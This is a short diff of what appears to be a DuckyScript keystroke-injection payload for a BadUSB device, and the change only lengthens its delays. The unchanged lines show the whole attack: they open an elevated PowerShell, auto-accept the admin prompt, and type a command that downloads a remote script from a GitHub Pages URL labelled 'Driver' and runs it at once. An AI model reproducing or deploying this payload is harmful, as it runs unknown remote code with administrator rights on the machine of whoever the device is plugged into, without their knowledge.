@@ -3,8 +3,8 @@ GUI r
 DELAY 500
 STRING powershell Start-Process powershell -Verb RunAs
 ENTER
-DELAY 1500
+DELAY 2000
 ALT y
-DELAY 1000
+DELAY 3000
 STRING irm https://pluizigegamer.github.io/Driver/menu.ps1 | iex
 ENTER
